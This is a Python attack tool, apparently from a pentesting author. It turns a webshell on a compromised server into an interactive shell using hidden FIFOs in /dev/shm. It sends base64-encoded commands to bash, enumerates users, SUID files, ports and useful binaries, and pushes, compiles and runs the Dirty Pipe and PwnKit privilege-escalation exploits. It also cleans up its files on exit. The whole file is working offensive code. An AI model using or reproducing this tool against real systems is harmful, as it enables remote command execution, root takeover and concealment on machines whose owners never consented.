#!/usr/bin/env python3

# Libraries
import requests
import threading
import signal
import sys
import time
import argparse
import subprocess
from base64 import b64encode
from random import randrange

# ------------------------------------
# Github: https://github.com/D3Ext
# Instagram: @D3Ext
# Twitter: @d3ext
# Linkedin: D3Ext
# ------------------------------------

# Katana banner
global mybanner
mybanner = '''\n              /\                               ______,....----,
/VVVVVVVVVVVVVV|===================""""""""""""       ___,..-\'
`^^^^^^^^^^^^^^|======================----------""""""
              \/'''

# Global Variables
global infile, outfile, mod
mod = randrange(1, 9999)
infile = f"/dev/shm/.fs/input.{mod}"
outfile = f"/dev/shm/.fs/output.{mod}"

# Colors
class c:
	PURPLE = '\033[95m'
	BLUE = '\033[94m'
	CYAN = '\033[96m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	END = '\033[0m'
	UNDERLINE = '\033[4m'

# Ctrl + C Function
def exit_handler(sig, frame):
	print(c.BLUE + "\n\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Interrupt handler received, exiting" + c.END)
	removeFiles(url, parameter)
	sys.exit(0)

signal.signal(signal.SIGINT, exit_handler)

# Remove input and output files at the exit
def removeFiles(url, parameter):
    removeCommand = """rm -rf /dev/shm/.fs/"""
    base64command = b64encode(removeCommand.encode()).decode()
    
    removeData = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }
    
    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Removing created files" + c.END)
    r = requests.post(url, data=removeData, timeout=5)
    
# Argument Parser Function
def parseArgs():
	p = argparse.ArgumentParser(description="D3Ext's Forwarded Shell - Interactive TTY and more")
	p.add_argument('-u', '--url', help="url of the webshell (Example: http://10.10.10.10/shell.php)", required=True)
	p.add_argument('-p', '--parameter', help="parameter of the webshell to exec commands (Example: cmd)", required=True)

	return p.parse_args()

# To check if the url receives the connections and requests
def checkConn(url):
	r = requests.get(url, timeout=5)
	if r.status_code == 200:
		print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection established succesfully" + c.END)
	else:
		print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Connection refused\n" + c.END)
		sys.exit(0)

# Function to create the fifos on the victim (to have an interactive tty)
def createFifos(url, parameter):
	
	# Create directory with the files in /dev/shm/.fs/
	raw_command = f"""mkdir /dev/shm/.fs"""
	base64command = b64encode(raw_command.encode()).decode()
    
	fifosData = {
		f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
	}

	r = requests.post(url, data=fifosData)

	# Create input and output files under /tmp/.fs/
	try:
		raw_command = f"""mkfifo {infile}; tail -f {infile} | /bin/sh 2>&1 > {outfile}"""
		base64command = b64encode(raw_command.encode()).decode()
    
		fifosData = {
			f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
		}

		print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Creating fifos on target system..." + c.END)
		r = requests.post(url, data=fifosData, timeout=2)
	except:
		None
	return None

# Function to read the file with the executed commands 
def readCommand(url, parameter):
	raw_command = f"""/bin/cat {outfile}"""
	base64command = b64encode(raw_command.encode()).decode()

	readData = {
		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
	}

	r = requests.post(url, data=readData, timeout=2)
	return r.text
    
# Function to clear the output file with every command
def clearOutput(url, parameter):
	raw_command = f"""echo '' > {outfile}"""
	base64command = b64encode(raw_command.encode()).decode()

	clearData = {
		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
	}

	r = requests.post(url, data=clearData)

# Function to execute commands after creating the fifos
def execCommand(url, parameter, command):
	base64command = b64encode(command.encode()).decode()

	rce_data = {
		f"{parameter}": f'echo "{base64command}" | base64 -d > {infile}'
	}

	r = requests.post(url, data=rce_data, timeout=10)

# Function to launch some privesc exploits
def tryExploits(url, parameter):
    
    bins = checkBinaries(url, parameter)
    if "gcc" not in bins:
        print(c.BLUE + "\ngcc not found in target system\n" + c.END)

    else:
        print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Uploading and compiling exploits" + c.END)

        exploit_content = open("exploits/cve-2022-0847.c", "r").read()
        base64exploit = b64encode(exploit_content.encode()).decode()
        command_to_exec = f"""echo {base64exploit} | base64 -d > /dev/shm/.fs/cve-2022-0847.c"""
        execCommand(url, parameter, command_to_exec + "\n")

        exploit_content = open("exploits/cve-2021-4034.c", "r").read()
        base64exploit = b64encode(exploit_content.encode()).decode()
        command_to_exec = f"""echo {base64exploit} | base64 -d > /dev/shm/.fs/cve-2021-4034.c"""
        execCommand(url, parameter, command_to_exec + "\n")

        command_to_exec = """gcc /dev/shm/.fs/cve-2022-0847.c -o /dev/shm/.fs/cve-2022-0847"""
        execCommand(url, parameter, command_to_exec + "\n")

        command_to_exec = """gcc /dev/shm/.fs/cve-2021-4034.c -o /dev/shm/.fs/cve-2021-4034"""
        execCommand(url, parameter, command_to_exec + "\n")
 
        command_to_exec = """chmod +x /dev/shm/.fs/cve-2022-0847"""
        execCommand(url, parameter, command_to_exec + "\n")

        command_to_exec = """chmod +x /dev/shm/.fs/cve-2021-4034"""
        execCommand(url, parameter, command_to_exec + "\n")

        print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Executing exploits" + c.END)
        time.sleep(0.5)
        print(c.BLUE + "\nExecuting Dity Pipe exploit" + c.END)
        command_to_exec = """/dev/shm/.fs/cve-2022-0847"""
        execCommand(url, parameter, command_to_exec + "\n")

        resp = readCommand(url, parameter)
        print(resp)
        clearOutput(url, parameter)

        print(c.BLUE + "\nExecuting pwnkit exploit" + c.END)
        command_to_exec = """/dev/shm/.fs/cve-2021-4034"""
        execCommand(url, parameter, command_to_exec + "\n")

        resp = readCommand(url, parameter)
        print(resp)
        clearOutput(url, parameter)
        
# Function to execute especial commands without the fifos and returning them
def execCustomCommand(url, parameter, command):
    base64command = b64encode(command.encode()).decode()

    rce_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=rce_data, timeout=10)
    return r.text

# Function to check useful binaries on the victim
def checkBinaries(url, parameter):
	raw_command = """which nmap aws nc ncat netcat nc.traditional wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python3.7 perl php ruby xterm sudo docker lxc 2>/dev/null"""
	base64command = b64encode(raw_command.encode()).decode()

	enum_data = {
		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
	}

	r = requests.post(url, data=enum_data, timeout=8)
	return r.text

# Function to enumerate the system
def enumSys(url, parameter):
    raw_command = """whoami"""
    user = execCustomCommand(url, parameter, raw_command)

    raw_command = """hostname"""
    hostname = execCustomCommand(url, parameter, raw_command)

    raw_command = """hostname -I"""
    ip = execCustomCommand(url, parameter, raw_command)

    raw_command = """uname -a"""
    uname = execCustomCommand(url, parameter, raw_command)

    raw_command = """id"""
    id_output = execCustomCommand(url, parameter, raw_command)

    raw_command = """ls /home"""
    users = execCustomCommand(url, parameter, raw_command)
    users = users.strip('\n').replace('\n', ', ')
    
    raw_command = """echo $PATH"""
    path = execCustomCommand(url, parameter, raw_command)

    raw_command = """sudo --version 2>/dev/null | head -n 1 | awk '{print $NF}'"""
    sudo_version = execCustomCommand(url, parameter, raw_command)

    return user, hostname, ip, uname, id_output, users, path, sudo_version

# Function to get the user and the hostname to create a realist shell
def getUserHostname(url, parameter):
    raw_command = """whoami"""
    user = execCustomCommand(url, parameter, raw_command)

    raw_command = """hostname"""
    hostname = execCustomCommand(url, parameter, raw_command)

    return user, hostname

# Main Function
if __name__ == '__main__':

    # Parse arguments and declare variables
    parse = parseArgs()

    url = parse.url
    parameter = parse.parameter

    # Print banner
    print(c.YELLOW + mybanner + c.END)

    # Check connection to the web shell
    checkConn(url)
	
    # Create an interactive shell
    createFifos(url, parameter)
    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Getting system info" + c.END)
    user, hostname = getUserHostname(url, parameter)

    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type dfs-help to see a list of custom commands of this forwarded shell\n" + c.END)
    
    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits"]
    # Loop to execute commands
    while True:
        if user == "root":
            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~# ")
        else:
            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~$ ")
        
        if command_to_exec == "dfs-help" or command_to_exec == "help-dfs":
            print(c.YELLOW + "\nCommands\t\tDescription" + c.END)
            print(c.YELLOW + "--------\t\t-----------" + c.END)
            print(c.BLUE + "dfs-enum\t\tenumerate common things of the system (users, groups, system info...)" + c.END)
            print(c.BLUE + "dfs-binaries\t\tsearch common binaries that can be used in the pentest" + c.END)
            print(c.BLUE + "dfs-exploit\t\ttry to escalate privileges using some exploits (pnwkit, dirty pipe)" + c.END)
            print(c.BLUE + "dfs-exit\t\texit from the forwarded shell and delete created files on the target" + c.END)

        if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Enumerating system, please wait a few seconds" + c.END)
            user, hostname, ip, uname, id_output, users, path, sudo_version = enumSys(url, parameter)
            
            raw_command = """find / \-perm -4000 2>/dev/null"""
            suid = execCustomCommand(url, parameter, raw_command)

            print(c.YELLOW + "\nInformation" + c.END)
            print(c.YELLOW + "-----------" + c.END)
            print(c.BLUE + "Current user: " + user.strip('\n') + c.END)
            print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
            print(c.BLUE + "Path: " + path.strip('\n') + c.END)
            print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
            print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
            print(c.BLUE + "Users in /home: " + users + c.END)
            if sudo_version:
                print(c.BLUE + "Sudo version: " + sudo_version.strip('\n') + c.END)
            else:
                print(c.BLUE + "Sudo version: Not found" + c.END)
            print(c.BLUE + "System info: " + uname + c.END) 
            print(c.YELLOW + "SUID Files" + c.END)
            print(c.YELLOW + "----------" + c.END)
            print(c.BLUE + suid + c.END)

            raw_command = """cat /proc/net/tcp | grep -v "sl" | awk '{print $3}' FS=":" | awk '{print $1}' | sort -u"""
            hex_ports = execCustomCommand(url, parameter, raw_command)

            print(c.YELLOW + "Local ports" + c.END)
            print(c.YELLOW + "----------" + c.END)
            for port in hex_ports.strip('\n').split('\n'):
                print(c.BLUE + str(int(port, 16)) + c.END)
            
        if command_to_exec == "dfs-binaries" or command_to_exec == "binaries-dfs":
            binList = checkBinaries(url, parameter)
            print(c.YELLOW + "\nUseful binaries" + c.END)
            print(c.YELLOW + "---------------" + c.END)
            print(c.BLUE + binList.strip('\n').strip('\n') + c.END)

        if command_to_exec == "dfs-exploit" or command_to_exec == "exploit-dfs":
            tryExploits(url, parameter)

        if command_to_exec == "dfs-exit" or command_to_exec == "exit-dfs":
            removeFiles(url, parameter)
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!\n" + c.END)
            sys.exit(0)
		
        if command_to_exec not in customCommands:
            execCommand(url, parameter, command_to_exec + "\n")
            # Read command output
            resp = readCommand(url, parameter)
            # Print command output
            print(resp)
            # Clear the file of the output
            clearOutput(url, parameter)


